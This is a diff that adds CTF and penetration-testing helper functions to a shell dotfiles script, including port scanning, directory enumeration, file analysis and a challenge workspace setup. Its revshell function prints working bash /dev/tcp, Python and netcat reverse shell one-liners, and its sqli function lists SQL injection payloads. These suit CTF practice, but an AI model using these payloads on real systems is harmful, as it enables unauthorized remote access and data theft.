@@ -141,3 +141,177 @@ update-all() {
 
     echo "✅ All updates complete!"
 }
+
+# === CTF & SECURITY FUNCTIONS ===
+
+# Quick port scan
+portscan() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: portscan <target>"
+        return 1
+    fi
+    nmap -sS -O "$1"
+}
+
+# Extract and analyze files
+ctf-extract() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: ctf-extract <file>"
+        return 1
+    fi
+
+    echo "🔍 Analyzing file: $1"
+    file "$1"
+    echo ""
+
+    echo "📊 File entropy:"
+    binwalk -E "$1"
+    echo ""
+
+    echo "🔍 Strings analysis:"
+    strings "$1" | head -20
+    echo ""
+
+    echo "📁 Binwalk extraction attempt:"
+    binwalk -e "$1"
+}
+
+# Quick web directory enumeration
+webenum() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: webenum <url>"
+        return 1
+    fi
+
+    echo "🔍 Enumerating directories on $1"
+    gobuster dir -u "$1" -w /usr/share/wordlists/dirb/common.txt -t 50
+}
+
+# Base64 encode/decode with automatic detection
+b64() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: b64 <string>"
+        echo "Automatically detects if input is base64 encoded"
+        return 1
+    fi
+
+    # Try to decode first (if it's valid base64)
+    if echo "$1" | base64 -d >/dev/null 2>&1; then
+        echo "🔓 Decoded:"
+        echo "$1" | base64 -d
+        echo ""
+    fi
+
+    echo "🔒 Encoded:"
+    echo "$1" | base64
+}
+
+# Hash analysis
+hashid() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: hashid <hash>"
+        return 1
+    fi
+
+    echo "🔍 Hash analysis for: $1"
+    echo "Length: ${#1}"
+
+    case ${#1} in
+        32) echo "Possible: MD5" ;;
+        40) echo "Possible: SHA1" ;;
+        64) echo "Possible: SHA256" ;;
+        96) echo "Possible: SHA384" ;;
+        128) echo "Possible: SHA512" ;;
+        *) echo "Unknown hash length" ;;
+    esac
+}
+
+# Quick reverse shell generator
+revshell() {
+    if [ $# -ne 2 ]; then
+        echo "Usage: revshell <ip> <port>"
+        return 1
+    fi
+
+    local ip="$1"
+    local port="$2"
+
+    echo "🐚 Reverse shell payloads for $ip:$port"
+    echo ""
+    echo "Bash:"
+    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+    echo ""
+    echo "Python:"
+    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    echo ""
+    echo "Netcat:"
+    echo "nc -e /bin/sh $ip $port"
+}
+
+# Quick listener
+listen() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: listen <port>"
+        return 1
+    fi
+
+    echo "👂 Listening on port $1"
+    nc -nlvp "$1"
+}
+
+# SQLi payload generator
+sqli() {
+    echo "💉 Common SQL injection payloads:"
+    echo ""
+    echo "Basic:"
+    echo "' OR '1'='1"
+    echo "' OR 1=1--"
+    echo "admin'--"
+    echo ""
+    echo "Union based:"
+    echo "' UNION SELECT null,null,null--"
+    echo "' UNION SELECT 1,user(),database()--"
+    echo ""
+    echo "Time based:"
+    echo "'; WAITFOR DELAY '00:00:05'--"
+    echo "' OR SLEEP(5)--"
+}
+
+# CTF challenge workspace setup
+ctf-workspace() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: ctf-workspace <challenge-name>"
+        return 1
+    fi
+
+    local challenge_name="$1"
+    local workspace_dir="$HOME/ctf/$challenge_name"
+
+    mkdir -p "$workspace_dir"
+    cd "$workspace_dir"
+
+    # Create common CTF directories
+    mkdir -p {scripts,files,notes,exploits,wordlists}
+
+    # Create a notes file
+    echo "# CTF Challenge: $challenge_name" > notes/README.md
+    echo "Date: $(date)" >> notes/README.md
+    echo "" >> notes/README.md
+    echo "## Challenge Description" >> notes/README.md
+    echo "" >> notes/README.md
+    echo "## Notes" >> notes/README.md
+    echo "" >> notes/README.md
+    echo "## Solution" >> notes/README.md
+
+    echo "🏁 CTF workspace created at $workspace_dir"
+    echo "📁 Created directories: scripts, files, notes, exploits, wordlists"
+}
+
+# Show installed tools summary
+show-tools() {
+    if [[ -f "$HOME/.dotfiles/scripts/show-tools.sh" ]]; then
+        bash "$HOME/.dotfiles/scripts/show-tools.sh"
+    else
+        echo "Tools summary script not found"
+    fi
+}
